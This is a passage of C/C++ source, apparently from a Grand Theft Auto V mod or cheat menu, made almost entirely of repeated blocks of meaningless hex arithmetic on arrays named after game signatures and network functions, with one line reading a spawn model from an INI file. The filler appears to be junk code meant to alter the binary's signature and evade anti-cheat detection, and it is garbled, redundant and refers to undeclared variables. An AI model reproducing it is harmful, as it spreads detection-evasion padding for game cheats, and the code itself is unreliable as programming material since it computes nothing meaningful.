				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				Spawn.Model = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
